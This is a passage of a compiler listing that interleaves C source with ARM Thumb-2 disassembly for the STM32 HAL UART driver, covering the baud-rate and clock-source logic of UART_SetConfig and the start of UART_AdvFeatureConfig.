  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 8005544:	68fb      	ldr	r3, [r7, #12]
 8005546:	681b      	ldr	r3, [r3, #0]
 8005548:	685b      	ldr	r3, [r3, #4]
 800554a:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 800554e:	68fb      	ldr	r3, [r7, #12]
 8005550:	68da      	ldr	r2, [r3, #12]
 8005552:	68fb      	ldr	r3, [r7, #12]
 8005554:	681b      	ldr	r3, [r3, #0]
 8005556:	430a      	orrs	r2, r1
 8005558:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 800555a:	68fb      	ldr	r3, [r7, #12]
 800555c:	699b      	ldr	r3, [r3, #24]
 800555e:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 8005560:	68fb      	ldr	r3, [r7, #12]
 8005562:	681b      	ldr	r3, [r3, #0]
 8005564:	4aa9      	ldr	r2, [pc, #676]	; (800580c <UART_SetConfig+0x304>)
 8005566:	4293      	cmp	r3, r2
 8005568:	d004      	beq.n	8005574 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 800556a:	68fb      	ldr	r3, [r7, #12]
 800556c:	6a1b      	ldr	r3, [r3, #32]
 800556e:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005570:	4313      	orrs	r3, r2
 8005572:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 8005574:	68fb      	ldr	r3, [r7, #12]
 8005576:	681b      	ldr	r3, [r3, #0]
 8005578:	689b      	ldr	r3, [r3, #8]
 800557a:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 800557e:	68fb      	ldr	r3, [r7, #12]
 8005580:	681b      	ldr	r3, [r3, #0]
 8005582:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005584:	430a      	orrs	r2, r1
 8005586:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 8005588:	68fb      	ldr	r3, [r7, #12]
 800558a:	681b      	ldr	r3, [r3, #0]
 800558c:	4aa0      	ldr	r2, [pc, #640]	; (8005810 <UART_SetConfig+0x308>)
 800558e:	4293      	cmp	r3, r2
 8005590:	d126      	bne.n	80055e0 <UART_SetConfig+0xd8>
 8005592:	4ba0      	ldr	r3, [pc, #640]	; (8005814 <UART_SetConfig+0x30c>)
 8005594:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005598:	f003 0303 	and.w	r3, r3, #3
 800559c:	2b03      	cmp	r3, #3
 800559e:	d81b      	bhi.n	80055d8 <UART_SetConfig+0xd0>
 80055a0:	a201      	add	r2, pc, #4	; (adr r2, 80055a8 <UART_SetConfig+0xa0>)
 80055a2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80055a6:	bf00      	nop
 80055a8:	080055b9 	.word	0x080055b9
 80055ac:	080055c9 	.word	0x080055c9
 80055b0:	080055c1 	.word	0x080055c1
 80055b4:	080055d1 	.word	0x080055d1
 80055b8:	2301      	movs	r3, #1
 80055ba:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055be:	e080      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80055c0:	2302      	movs	r3, #2
 80055c2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055c6:	e07c      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80055c8:	2304      	movs	r3, #4
 80055ca:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055ce:	e078      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80055d0:	2308      	movs	r3, #8
 80055d2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055d6:	e074      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80055d8:	2310      	movs	r3, #16
 80055da:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055de:	e070      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80055e0:	68fb      	ldr	r3, [r7, #12]
 80055e2:	681b      	ldr	r3, [r3, #0]
 80055e4:	4a8c      	ldr	r2, [pc, #560]	; (8005818 <UART_SetConfig+0x310>)
 80055e6:	4293      	cmp	r3, r2
 80055e8:	d138      	bne.n	800565c <UART_SetConfig+0x154>
 80055ea:	4b8a      	ldr	r3, [pc, #552]	; (8005814 <UART_SetConfig+0x30c>)
 80055ec:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80055f0:	f003 030c 	and.w	r3, r3, #12
 80055f4:	2b0c      	cmp	r3, #12
 80055f6:	d82d      	bhi.n	8005654 <UART_SetConfig+0x14c>
 80055f8:	a201      	add	r2, pc, #4	; (adr r2, 8005600 <UART_SetConfig+0xf8>)
 80055fa:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80055fe:	bf00      	nop
 8005600:	08005635 	.word	0x08005635
 8005604:	08005655 	.word	0x08005655
 8005608:	08005655 	.word	0x08005655
 800560c:	08005655 	.word	0x08005655
 8005610:	08005645 	.word	0x08005645
 8005614:	08005655 	.word	0x08005655
 8005618:	08005655 	.word	0x08005655
 800561c:	08005655 	.word	0x08005655
 8005620:	0800563d 	.word	0x0800563d
 8005624:	08005655 	.word	0x08005655
 8005628:	08005655 	.word	0x08005655
 800562c:	08005655 	.word	0x08005655
 8005630:	0800564d 	.word	0x0800564d
 8005634:	2300      	movs	r3, #0
 8005636:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800563a:	e042      	b.n	80056c2 <UART_SetConfig+0x1ba>
 800563c:	2302      	movs	r3, #2
 800563e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005642:	e03e      	b.n	80056c2 <UART_SetConfig+0x1ba>
 8005644:	2304      	movs	r3, #4
 8005646:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800564a:	e03a      	b.n	80056c2 <UART_SetConfig+0x1ba>
 800564c:	2308      	movs	r3, #8
 800564e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005652:	e036      	b.n	80056c2 <UART_SetConfig+0x1ba>
 8005654:	2310      	movs	r3, #16
 8005656:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800565a:	e032      	b.n	80056c2 <UART_SetConfig+0x1ba>
 800565c:	68fb      	ldr	r3, [r7, #12]
 800565e:	681b      	ldr	r3, [r3, #0]
 8005660:	4a6a      	ldr	r2, [pc, #424]	; (800580c <UART_SetConfig+0x304>)
 8005662:	4293      	cmp	r3, r2
 8005664:	d12a      	bne.n	80056bc <UART_SetConfig+0x1b4>
 8005666:	4b6b      	ldr	r3, [pc, #428]	; (8005814 <UART_SetConfig+0x30c>)
 8005668:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800566c:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 8005670:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005674:	d01a      	beq.n	80056ac <UART_SetConfig+0x1a4>
 8005676:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 800567a:	d81b      	bhi.n	80056b4 <UART_SetConfig+0x1ac>
 800567c:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005680:	d00c      	beq.n	800569c <UART_SetConfig+0x194>
 8005682:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005686:	d815      	bhi.n	80056b4 <UART_SetConfig+0x1ac>
 8005688:	2b00      	cmp	r3, #0
 800568a:	d003      	beq.n	8005694 <UART_SetConfig+0x18c>
 800568c:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8005690:	d008      	beq.n	80056a4 <UART_SetConfig+0x19c>
 8005692:	e00f      	b.n	80056b4 <UART_SetConfig+0x1ac>
 8005694:	2300      	movs	r3, #0
 8005696:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800569a:	e012      	b.n	80056c2 <UART_SetConfig+0x1ba>
 800569c:	2302      	movs	r3, #2
 800569e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056a2:	e00e      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80056a4:	2304      	movs	r3, #4
 80056a6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056aa:	e00a      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80056ac:	2308      	movs	r3, #8
 80056ae:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056b2:	e006      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80056b4:	2310      	movs	r3, #16
 80056b6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056ba:	e002      	b.n	80056c2 <UART_SetConfig+0x1ba>
 80056bc:	2310      	movs	r3, #16
 80056be:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 80056c2:	68fb      	ldr	r3, [r7, #12]
 80056c4:	681b      	ldr	r3, [r3, #0]
 80056c6:	4a51      	ldr	r2, [pc, #324]	; (800580c <UART_SetConfig+0x304>)
 80056c8:	4293      	cmp	r3, r2
 80056ca:	d17a      	bne.n	80057c2 <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 80056cc:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80056d0:	2b08      	cmp	r3, #8
 80056d2:	d824      	bhi.n	800571e <UART_SetConfig+0x216>
 80056d4:	a201      	add	r2, pc, #4	; (adr r2, 80056dc <UART_SetConfig+0x1d4>)
 80056d6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80056da:	bf00      	nop
 80056dc:	08005701 	.word	0x08005701
 80056e0:	0800571f 	.word	0x0800571f
 80056e4:	08005709 	.word	0x08005709
 80056e8:	0800571f 	.word	0x0800571f
 80056ec:	0800570f 	.word	0x0800570f
 80056f0:	0800571f 	.word	0x0800571f
 80056f4:	0800571f 	.word	0x0800571f
 80056f8:	0800571f 	.word	0x0800571f
 80056fc:	08005717 	.word	0x08005717
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005700:	f7fe fe6c 	bl	80043dc <HAL_RCC_GetPCLK1Freq>
 8005704:	61f8      	str	r0, [r7, #28]
        break;
 8005706:	e010      	b.n	800572a <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005708:	4b44      	ldr	r3, [pc, #272]	; (800581c <UART_SetConfig+0x314>)
 800570a:	61fb      	str	r3, [r7, #28]
        break;
 800570c:	e00d      	b.n	800572a <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 800570e:	f7fe fdcd 	bl	80042ac <HAL_RCC_GetSysClockFreq>
 8005712:	61f8      	str	r0, [r7, #28]
        break;
 8005714:	e009      	b.n	800572a <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005716:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800571a:	61fb      	str	r3, [r7, #28]
        break;
 800571c:	e005      	b.n	800572a <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 800571e:	2300      	movs	r3, #0
 8005720:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005722:	2301      	movs	r3, #1
 8005724:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005728:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 800572a:	69fb      	ldr	r3, [r7, #28]
 800572c:	2b00      	cmp	r3, #0
 800572e:	f000 8107 	beq.w	8005940 <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005732:	68fb      	ldr	r3, [r7, #12]
 8005734:	685a      	ldr	r2, [r3, #4]
 8005736:	4613      	mov	r3, r2
 8005738:	005b      	lsls	r3, r3, #1
 800573a:	4413      	add	r3, r2
 800573c:	69fa      	ldr	r2, [r7, #28]
 800573e:	429a      	cmp	r2, r3
 8005740:	d305      	bcc.n	800574e <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 8005742:	68fb      	ldr	r3, [r7, #12]
 8005744:	685b      	ldr	r3, [r3, #4]
 8005746:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005748:	69fa      	ldr	r2, [r7, #28]
 800574a:	429a      	cmp	r2, r3
 800574c:	d903      	bls.n	8005756 <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 800574e:	2301      	movs	r3, #1
 8005750:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005754:	e0f4      	b.n	8005940 <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 8005756:	69fb      	ldr	r3, [r7, #28]
 8005758:	2200      	movs	r2, #0
 800575a:	461c      	mov	r4, r3
 800575c:	4615      	mov	r5, r2
 800575e:	f04f 0200 	mov.w	r2, #0
 8005762:	f04f 0300 	mov.w	r3, #0
 8005766:	022b      	lsls	r3, r5, #8
 8005768:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 800576c:	0222      	lsls	r2, r4, #8
 800576e:	68f9      	ldr	r1, [r7, #12]
 8005770:	6849      	ldr	r1, [r1, #4]
 8005772:	0849      	lsrs	r1, r1, #1
 8005774:	2000      	movs	r0, #0
 8005776:	4688      	mov	r8, r1
 8005778:	4681      	mov	r9, r0
 800577a:	eb12 0a08 	adds.w	sl, r2, r8
 800577e:	eb43 0b09 	adc.w	fp, r3, r9
 8005782:	68fb      	ldr	r3, [r7, #12]
 8005784:	685b      	ldr	r3, [r3, #4]
 8005786:	2200      	movs	r2, #0
 8005788:	603b      	str	r3, [r7, #0]
 800578a:	607a      	str	r2, [r7, #4]
 800578c:	e9d7 2300 	ldrd	r2, r3, [r7]
 8005790:	4650      	mov	r0, sl
 8005792:	4659      	mov	r1, fp
 8005794:	f7fa fd22 	bl	80001dc <__aeabi_uldivmod>
 8005798:	4602      	mov	r2, r0
 800579a:	460b      	mov	r3, r1
 800579c:	4613      	mov	r3, r2
 800579e:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 80057a0:	69bb      	ldr	r3, [r7, #24]
 80057a2:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 80057a6:	d308      	bcc.n	80057ba <UART_SetConfig+0x2b2>
 80057a8:	69bb      	ldr	r3, [r7, #24]
 80057aa:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 80057ae:	d204      	bcs.n	80057ba <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 80057b0:	68fb      	ldr	r3, [r7, #12]
 80057b2:	681b      	ldr	r3, [r3, #0]
 80057b4:	69ba      	ldr	r2, [r7, #24]
 80057b6:	60da      	str	r2, [r3, #12]
 80057b8:	e0c2      	b.n	8005940 <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 80057ba:	2301      	movs	r3, #1
 80057bc:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80057c0:	e0be      	b.n	8005940 <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 80057c2:	68fb      	ldr	r3, [r7, #12]
 80057c4:	69db      	ldr	r3, [r3, #28]
 80057c6:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 80057ca:	d16a      	bne.n	80058a2 <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 80057cc:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80057d0:	2b08      	cmp	r3, #8
 80057d2:	d834      	bhi.n	800583e <UART_SetConfig+0x336>
 80057d4:	a201      	add	r2, pc, #4	; (adr r2, 80057dc <UART_SetConfig+0x2d4>)
 80057d6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80057da:	bf00      	nop
 80057dc:	08005801 	.word	0x08005801
 80057e0:	08005821 	.word	0x08005821
 80057e4:	08005829 	.word	0x08005829
 80057e8:	0800583f 	.word	0x0800583f
 80057ec:	0800582f 	.word	0x0800582f
 80057f0:	0800583f 	.word	0x0800583f
 80057f4:	0800583f 	.word	0x0800583f
 80057f8:	0800583f 	.word	0x0800583f
 80057fc:	08005837 	.word	0x08005837
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005800:	f7fe fdec 	bl	80043dc <HAL_RCC_GetPCLK1Freq>
 8005804:	61f8      	str	r0, [r7, #28]
        break;
 8005806:	e020      	b.n	800584a <UART_SetConfig+0x342>
 8005808:	efff69f3 	.word	0xefff69f3
 800580c:	40008000 	.word	0x40008000
 8005810:	40013800 	.word	0x40013800
 8005814:	40021000 	.word	0x40021000
 8005818:	40004400 	.word	0x40004400
 800581c:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005820:	f7fe fdf2 	bl	8004408 <HAL_RCC_GetPCLK2Freq>
 8005824:	61f8      	str	r0, [r7, #28]
        break;
 8005826:	e010      	b.n	800584a <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005828:	4b4c      	ldr	r3, [pc, #304]	; (800595c <UART_SetConfig+0x454>)
 800582a:	61fb      	str	r3, [r7, #28]
        break;
 800582c:	e00d      	b.n	800584a <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 800582e:	f7fe fd3d 	bl	80042ac <HAL_RCC_GetSysClockFreq>
 8005832:	61f8      	str	r0, [r7, #28]
        break;
 8005834:	e009      	b.n	800584a <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005836:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800583a:	61fb      	str	r3, [r7, #28]
        break;
 800583c:	e005      	b.n	800584a <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 800583e:	2300      	movs	r3, #0
 8005840:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005842:	2301      	movs	r3, #1
 8005844:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005848:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 800584a:	69fb      	ldr	r3, [r7, #28]
 800584c:	2b00      	cmp	r3, #0
 800584e:	d077      	beq.n	8005940 <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 8005850:	69fb      	ldr	r3, [r7, #28]
 8005852:	005a      	lsls	r2, r3, #1
 8005854:	68fb      	ldr	r3, [r7, #12]
 8005856:	685b      	ldr	r3, [r3, #4]
 8005858:	085b      	lsrs	r3, r3, #1
 800585a:	441a      	add	r2, r3
 800585c:	68fb      	ldr	r3, [r7, #12]
 800585e:	685b      	ldr	r3, [r3, #4]
 8005860:	fbb2 f3f3 	udiv	r3, r2, r3
 8005864:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005866:	69bb      	ldr	r3, [r7, #24]
 8005868:	2b0f      	cmp	r3, #15
 800586a:	d916      	bls.n	800589a <UART_SetConfig+0x392>
 800586c:	69bb      	ldr	r3, [r7, #24]
 800586e:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005872:	d212      	bcs.n	800589a <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 8005874:	69bb      	ldr	r3, [r7, #24]
 8005876:	b29b      	uxth	r3, r3
 8005878:	f023 030f 	bic.w	r3, r3, #15
 800587c:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 800587e:	69bb      	ldr	r3, [r7, #24]
 8005880:	085b      	lsrs	r3, r3, #1
 8005882:	b29b      	uxth	r3, r3
 8005884:	f003 0307 	and.w	r3, r3, #7
 8005888:	b29a      	uxth	r2, r3
 800588a:	8afb      	ldrh	r3, [r7, #22]
 800588c:	4313      	orrs	r3, r2
 800588e:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 8005890:	68fb      	ldr	r3, [r7, #12]
 8005892:	681b      	ldr	r3, [r3, #0]
 8005894:	8afa      	ldrh	r2, [r7, #22]
 8005896:	60da      	str	r2, [r3, #12]
 8005898:	e052      	b.n	8005940 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 800589a:	2301      	movs	r3, #1
 800589c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80058a0:	e04e      	b.n	8005940 <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 80058a2:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80058a6:	2b08      	cmp	r3, #8
 80058a8:	d827      	bhi.n	80058fa <UART_SetConfig+0x3f2>
 80058aa:	a201      	add	r2, pc, #4	; (adr r2, 80058b0 <UART_SetConfig+0x3a8>)
 80058ac:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80058b0:	080058d5 	.word	0x080058d5
 80058b4:	080058dd 	.word	0x080058dd
 80058b8:	080058e5 	.word	0x080058e5
 80058bc:	080058fb 	.word	0x080058fb
 80058c0:	080058eb 	.word	0x080058eb
 80058c4:	080058fb 	.word	0x080058fb
 80058c8:	080058fb 	.word	0x080058fb
 80058cc:	080058fb 	.word	0x080058fb
 80058d0:	080058f3 	.word	0x080058f3
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 80058d4:	f7fe fd82 	bl	80043dc <HAL_RCC_GetPCLK1Freq>
 80058d8:	61f8      	str	r0, [r7, #28]
        break;
 80058da:	e014      	b.n	8005906 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 80058dc:	f7fe fd94 	bl	8004408 <HAL_RCC_GetPCLK2Freq>
 80058e0:	61f8      	str	r0, [r7, #28]
        break;
 80058e2:	e010      	b.n	8005906 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 80058e4:	4b1d      	ldr	r3, [pc, #116]	; (800595c <UART_SetConfig+0x454>)
 80058e6:	61fb      	str	r3, [r7, #28]
        break;
 80058e8:	e00d      	b.n	8005906 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 80058ea:	f7fe fcdf 	bl	80042ac <HAL_RCC_GetSysClockFreq>
 80058ee:	61f8      	str	r0, [r7, #28]
        break;
 80058f0:	e009      	b.n	8005906 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 80058f2:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80058f6:	61fb      	str	r3, [r7, #28]
        break;
 80058f8:	e005      	b.n	8005906 <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 80058fa:	2300      	movs	r3, #0
 80058fc:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 80058fe:	2301      	movs	r3, #1
 8005900:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005904:	bf00      	nop
    }

    if (pclk != 0U)
 8005906:	69fb      	ldr	r3, [r7, #28]
 8005908:	2b00      	cmp	r3, #0
 800590a:	d019      	beq.n	8005940 <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 800590c:	68fb      	ldr	r3, [r7, #12]
 800590e:	685b      	ldr	r3, [r3, #4]
 8005910:	085a      	lsrs	r2, r3, #1
 8005912:	69fb      	ldr	r3, [r7, #28]
 8005914:	441a      	add	r2, r3
 8005916:	68fb      	ldr	r3, [r7, #12]
 8005918:	685b      	ldr	r3, [r3, #4]
 800591a:	fbb2 f3f3 	udiv	r3, r2, r3
 800591e:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005920:	69bb      	ldr	r3, [r7, #24]
 8005922:	2b0f      	cmp	r3, #15
 8005924:	d909      	bls.n	800593a <UART_SetConfig+0x432>
 8005926:	69bb      	ldr	r3, [r7, #24]
 8005928:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 800592c:	d205      	bcs.n	800593a <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 800592e:	69bb      	ldr	r3, [r7, #24]
 8005930:	b29a      	uxth	r2, r3
 8005932:	68fb      	ldr	r3, [r7, #12]
 8005934:	681b      	ldr	r3, [r3, #0]
 8005936:	60da      	str	r2, [r3, #12]
 8005938:	e002      	b.n	8005940 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 800593a:	2301      	movs	r3, #1
 800593c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 8005940:	68fb      	ldr	r3, [r7, #12]
 8005942:	2200      	movs	r2, #0
 8005944:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 8005946:	68fb      	ldr	r3, [r7, #12]
 8005948:	2200      	movs	r2, #0
 800594a:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 800594c:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 8005950:	4618      	mov	r0, r3
 8005952:	3728      	adds	r7, #40	; 0x28
 8005954:	46bd      	mov	sp, r7
 8005956:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 800595a:	bf00      	nop
 800595c:	00f42400 	.word	0x00f42400

08005960 <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 8005960:	b480      	push	{r7}
 8005962:	b083      	sub	sp, #12
 8005964:	af00      	add	r7, sp, #0
 8005966:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 8005968:	687b      	ldr	r3, [r7, #4]
 800596a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800596c:	f003 0308 	and.w	r3, r3, #8
 8005970:	2b00      	cmp	r3, #0
 8005972:	d00a      	beq.n	800598a <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 8005974:	687b      	ldr	r3, [r7, #4]
 8005976:	681b      	ldr	r3, [r3, #0]
 8005978:	685b      	ldr	r3, [r3, #4]
 800597a:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 800597e:	687b      	ldr	r3, [r7, #4]
 8005980:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 8005982:	687b      	ldr	r3, [r7, #4]
 8005984:	681b      	ldr	r3, [r3, #0]
 8005986:	430a      	orrs	r2, r1
 8005988:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 800598a:	687b      	ldr	r3, [r7, #4]
 800598c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800598e:	f003 0301 	and.w	r3, r3, #1
 8005992:	2b00      	cmp	r3, #0
